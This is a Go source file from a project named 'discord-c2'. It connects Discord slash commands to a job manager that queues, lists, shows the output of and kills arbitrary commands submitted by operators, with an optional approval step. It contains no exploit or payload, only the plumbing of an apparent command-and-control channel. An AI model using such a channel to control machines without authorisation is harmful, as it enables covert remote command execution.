package commands

// This file wires interactions to the asynchronous job manager.

import (
	"fmt"
	"strings"
	"time"

	"discord-c2/internal/jobs"

	"github.com/bwmarrin/discordgo"
)

var (
	jobManager   *jobs.Manager
	processStart = time.Now()
)

// SetJobs installs the job manager used by command handlers.
func SetJobs(m *jobs.Manager) { jobManager = m }

// startJob queues cmd and acknowledges the interaction with the job ID.
func startJob(s *discordgo.Session, i *discordgo.InteractionCreate, operator, channelID, cmd string) {
	if jobManager == nil {
		respondEphemeral(s, i, "Job manager is not configured.")
		return
	}
	if requireApproval {
		startApproval(s, i, operator, channelID, cmd)
		return
	}
	job, err := jobManager.Start(operator, channelID, cmd, 0)
	if err != nil {
		respondEphemeral(s, i, "❌ "+err.Error())
		return
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{Content: jobs.Ack(job)},
	})
}

// handleJobsGroup implements /jobs list|show|kill.
func handleJobsGroup(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	name, sub := subData(data)
	if jobManager == nil {
		respondEphemeral(s, i, "Job manager is not configured.")
		return
	}

	switch name {
	case "list":
		respondEphemeral(s, i, renderJobList(jobManager.List(10)))
	case "show":
		id := stringOption(sub, "id")
		job, ok := jobManager.Get(id)
		if !ok {
			respondEphemeral(s, i, "No job with id `"+id+"`.")
			return
		}
		chunks := jobs.ResultChunks(job, 1700)
		if len(chunks) == 0 {
			respondEphemeral(s, i, "No output recorded.")
			return
		}
		respondEphemeral(s, i, chunks[0])
		for _, chunk := range chunks[1:] {
			_, _ = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
				Content: chunk,
				Flags:   discordgo.MessageFlagsEphemeral,
			})
		}
	case "kill":
		id := stringOption(sub, "id")
		if jobManager.Kill(id) {
			respondEphemeral(s, i, "⛔ kill sent for `"+id+"`.")
			return
		}
		respondEphemeral(s, i, "No running job with id `"+id+"`.")
	}
}

func renderJobList(list []jobs.Job) string {
	if len(list) == 0 {
		return "No jobs recorded."
	}
	var b strings.Builder
	b.WriteString("**Recent jobs**\n")
	for _, j := range list {
		fmt.Fprintf(&b, "`%s` %-9s %6s  %s\n",
			j.ID, j.Status, j.Duration().Round(time.Millisecond), truncate(j.Command, 60))
	}
	return b.String()
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "…"
}
